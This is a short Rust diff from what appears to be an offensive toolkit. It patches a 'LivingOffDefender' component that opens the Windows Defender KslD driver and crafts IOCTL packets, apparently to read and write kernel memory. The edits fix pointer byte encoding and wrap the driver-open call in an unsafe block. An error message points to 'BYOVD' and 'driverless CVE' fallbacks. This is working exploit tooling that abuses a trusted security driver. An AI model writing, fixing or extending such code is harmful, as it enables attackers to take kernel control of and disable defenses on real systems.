@@ -335,7 +335,7 @@ mod windows_impl {
                 pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                     .copy_from_slice(&(chunk as u32).to_le_bytes());
                 pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
-                    .copy_from_slice(&buf_ptr);
+                    .copy_from_slice(&buf_ptr.to_le_bytes());
 
                 let mut bytes_returned: u32 = 0;
                 let ok = unsafe {
@@ -376,7 +376,7 @@ mod windows_impl {
                 pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                     .copy_from_slice(&(chunk as u32).to_le_bytes());
                 pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
-                    .copy_from_slice(&buf_ptr);
+                    .copy_from_slice(&buf_ptr.to_le_bytes());
 
                 let mut bytes_returned: u32 = 0;
                 let ok = unsafe {
@@ -448,7 +448,8 @@ impl KernelRw for LivingOffDefender {
 /// # Safety
 /// Opens a handle to a kernel driver device. The device is pre-loaded by the OS.
 pub unsafe fn bootstrap_ksld() -> Result<LivingOffDefender, KitError> {
-    LivingOffDefender::open(None).map_err(|e| {
+    // SAFETY: caller ensures we're in a safe environment to open driver handles.
+    unsafe { LivingOffDefender::open(None) }.map_err(|e| {
         KitError::Other(alloc::format!(
             "KslD bootstrap failed: {}. Is Windows Defender running? \
              Fallback: use BYOVD (bootstrap_byovd) or driverless CVE.",
